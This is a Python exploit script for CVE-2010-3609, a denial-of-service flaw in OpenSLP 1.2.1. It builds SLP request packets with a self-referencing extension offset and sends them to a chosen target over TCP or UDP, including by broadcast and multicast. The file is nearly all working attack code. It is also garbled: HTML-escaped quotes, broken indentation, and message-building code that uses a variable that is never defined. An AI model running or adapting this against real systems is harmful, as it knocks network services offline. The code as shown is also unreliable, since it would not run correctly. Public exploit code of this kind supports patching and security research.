 
# Title: OpenSLP DoS
# Author: Nicolas Gregoire (@Agarri_FR)
# CVE: 2010-3609
# Software download: http://www.openslp.org/download.html
# Version: v1.2.1 and trunk before revision 1647
# Tested on: Linux Ubuntu 10.04, VMware ESX 4.0
# Notes: It affects some others SLP softwares, like mSLP. More details (in French) on my blog => http://goo.gl/s0zHq
 
&#039;&#039;&#039; ==================================
          Pseudo documentation
================================== &#039;&#039;&#039;
 
# SLPick, extension DoS release
# by Nicolas Gregoire
 
&#039;&#039;&#039; ==================================
             Imports
================================== &#039;&#039;&#039;
 
import getopt
import re
import sys
import binascii
import struct
import socket
import os
 
 
&#039;&#039;&#039; ==================================
        Default values
================================== &#039;&#039;&#039;
 
version = &#039;0.4&#039;
mode = &#039;unicast&#039;
source = &#039;N/A&#039;
target = &#039;N/A&#039;
xid = &#039;\x12\x34&#039;
port = 427
nb = 1
req = &#039;sr&#039;
 
&#039;&#039;&#039; ==================================
        Standard functions
================================== &#039;&#039;&#039;
 
# Some nice formatting
def zprint(str):
    print &#039;[=] &#039; + str
 
# Function displaying CLI arguments
def showUsage():
    print &#039;Usage : &#039; + sys.argv[0] + &#039; [-h] [-m mode] [-p port] [-n number] [-s source_IP] [-t target_IP]&#039;
    print &#039;\t[-h] Help (this text)&#039;
    print &#039;\t[-m] Mode : tcp / unicast / broadcast / multicast (default is "&#039; + mode + &#039;")&#039;
    print &#039;\t[-p] Port : default is "&#039; + str(port) + &#039;"&#039;
    print &#039;\t[-s] Source IP Adress : no default (used only in multicast mode)&#039;
    print &#039;\t[-t] Target IP Adress : no default (forced in multicast mode)&#039;
    print &#039;\t[-n] Number of extensions : 0 (no bug) / 1 (default) / 2 (trailing extension)&#039;
    print &#039;\t[-r] Request type : sr (ServerRequest, default) / ar (AttributeRequest)&#039;
    sys.exit(1)
 
# Function parsing parameters
def getArguments():
    try:
        optlist, list = getopt.getopt(sys.argv[1:], &#039;hm:p:t:s:n:r:&#039;)
    except getopt.GetoptError:
        showUsage()
    for opt in optlist:
        if opt[0] == &#039;-h&#039;:
            showUsage()
        if opt[0] == &#039;-p&#039;:
            global port
            port = opt[1]
        if opt[0] == &#039;-s&#039;:
            global source
            source = opt[1]
        if opt[0] == &#039;-t&#039;:
            global target
            target = opt[1]
        if opt[0] == &#039;-m&#039;:
            global mode
        mode = opt[1]
        if opt[0] == &#039;-n&#039;:
            global nb
        nb = int(opt[1])
        if opt[0] == &#039;-r&#039;:
            global req
        req = opt[1]
 
# Function checking parameters
def checkArguments():
    if (mode == &#039;multicast&#039;):
        # XID : must be 0 in multicast mode
        # Target IP : default SLP multicast address
        # Source IP : address of the local interface
        global xid
        xid = &#039;\x00\x00&#039;
    zprint(&#039;Forcing XID to "0"&#039;)
        global target
    target = &#039;239.255.255.253&#039;
    zprint(&#039;Forcing target IP to "&#039; + target + &#039;"&#039;)
        if (source != &#039;N/A&#039;) :
        zprint(&#039;Forcing source IP to "&#039; + source + &#039;"&#039;)
        else:
        zprint(&#039;You need to force the source address with "-s" !&#039;)
            showUsage()
    elif (mode == &#039;unicast&#039;) or (mode == &#039;broadcast&#039;) or (mode == &#039;multicast&#039;) or (mode == &#039;tcp&#039;):
        # Target IP : must be defined
        if (target == &#039;N/A&#039;) :
            zprint(&#039;Invalid target !&#039;)
            showUsage()
    else :
        zprint(&#039;Invalid mode !&#039;)
        showUsage()
 
&#039;&#039;&#039; ==================================
        SLP functions
================================== &#039;&#039;&#039;
 
# Define payload of type "Service Request"
def getServRequest():
 
    zprint(&#039;Creating payload of type "Service Request"&#039;)
 
    # Function type
    f = &#039;\x01&#039;
    # Empty fields
    scope_length = &#039;\x00\x00&#039;
    spi_length = &#039;\x00\x00&#039;
    # Variable-size fields
    service = &#039;service:directory-agent&#039;
    service_length = struct.pack(&#039;!h&#039;, len(service))
    # Create message
 
    return(f, m)
 
# Define payload of type "Attribute Request"
def getAttrRequest():
 
    zprint(&#039;Creating payload of type "Attribue Request"&#039;)
 
    # Function type
    f = &#039;\x06&#039;
    # Empty fields
    tag_length = &#039;\x00\x00&#039;
    spi_length = &#039;\x00\x00&#039;
    # Variable-size fields
    url = &#039;http://www.agarri.fr/&#039;
    url_length = struct.pack(&#039;!h&#039;, len(url))
    scope = &#039;default&#039;
    scope_length = struct.pack(&#039;!h&#039;, len(scope))
    # Create message
    m += url_length + url + scope_length + scope
    m += tag_length + spi_length
 
    return(f, m)
 
# Define the function creating the full SLP packet
def createPacket(function, message):
 
    zprint(&#039;Adding headers and trailers&#039;)
 
    # SLP Version
    version = &#039;\x02&#039;
        # Set the &#039;Multicast required&#039; flag to 1
    if (mode == &#039;broadcast&#039; or mode == &#039;multicast&#039;):
        flags = &#039;\x20\x00&#039;
        else:
            flags = &#039;\x00\x00&#039;
 
        #######################################################
        # Here&#039;s the bug !!!!
        #######################################################
        zprint(&#039;Using &#039; + str(nb) + &#039; extension(s)&#039;)
        if (nb == 0):
            # No extension == no bug
        next_ext_offset = &#039;\x00\x00\x00&#039;
        extension = &#039;&#039;
    elif (nb == 1):
            # Loop over itself
        next_ext_offset = &#039;\x00\x00\x05&#039;
        extension = &#039;&#039;
        elif (nb == 2) :
            # Point to another extension located at the end of the packet
            # TODO : Calculate it at runtime
        if (req == &#039;sr&#039;):
                next_ext_offset = &#039;\x00\x00\x31&#039;
            else :
                next_ext_offset = &#039;\x00\x00\x36&#039;
            # OpenSLP : extid should be < 0x4000 or > 0x7FFF
        ext_id = &#039;\xBA\xBE&#039;
        ext_nextoffset = next_ext_offset
        # Could be anything
            ext_data = &#039;\x22\x22&#039;
        # Create the trailing extension
            extension = ext_id + ext_nextoffset + ext_data
        else:
        print &#039;Wrong number of extensions&#039;
            sys.exit(1)
 
    # Variable-size headers
    lang = &#039;en&#039;
    lang_length = struct.pack(&#039;!h&#039;, len(lang))
 
    # Assemble headers
    headers = flags + next_ext_offset + xid + lang_length + lang
 
    # Packet = version + function + overall size + headers + message + extension
    packet = version + function + &#039;\x00&#039;
    packet += struct.pack(&#039;!h&#039;, len(headers + message + extension) + 5)
    packet += headers + message + extension
 
    return packet
 
&#039;&#039;&#039; ==================================
           Send packet via TCP or UDP
================================== &#039;&#039;&#039;
 
# Send via TCP
def sendTcpPacket(packet):
 
    zprint(&#039;Sending packet via TCP [&#039; + target + &#039;]&#039;)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
        try:
            s.connect((target, port))
        except socket.error:
            zprint(&#039;Socket error (port closed ?)&#039;)
            sys.exit(1)
    s.send(packet)
    s.close
 
# Send via unicast UDP
def sendUnicastPacket(packet):
 
    zprint(&#039;Sending packet via Unicast UDP [&#039; + target + &#039;]&#039;)
    s = socket.socket( socket.AF_INET, socket.SOCK_DGRAM )
    s.sendto( packet, (target, port) )
 
# Send via broadcast UDP
def sendBroadcastPacket(packet):
 
        zprint(&#039;Sending packet via Broadcast UDP [&#039; + target + &#039;]&#039;)
    s = socket.socket( socket.AF_INET, socket.SOCK_DGRAM )
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.sendto( packet, (target, port) )
 
# Send via multicast UDP
def sendMulticastPacket(packet):
 
    zprint(&#039;Sending packet via Multicast UDP [&#039; + target + &#039;]&#039;)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.bind((source, 6666)) # Select an interface (and an evil port ;-)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
    sock.sendto(packet, (target, port) );
 
&#039;&#039;&#039; ==================================
           Main code
================================== &#039;&#039;&#039;
 
# Print banner
zprint(&#039;SLPick : SLP client v&#039; + version + &#039; (by Nicolas Gregoire)&#039;)
 
# Set options
getArguments()
checkArguments()
 
# Which payload ?
if (req == &#039;ar&#039;):
    func, payload = getAttrRequest()
else :
    func, payload = getServRequest()
 
# Add headers and trailers (including extensions)
packet = createPacket(func, payload)
 
# TCP
if (mode == &#039;tcp&#039;):
    sendTcpPacket(packet)
# UDP
elif (mode == &#039;unicast&#039;):
    sendUnicastPacket(packet)
elif (mode == &#039;broadcast&#039;):
    sendBroadcastPacket(packet)
elif (mode == &#039;multicast&#039;):
    sendMulticastPacket(packet)
 
# Exit
zprint(&#039;Exit&#039;)



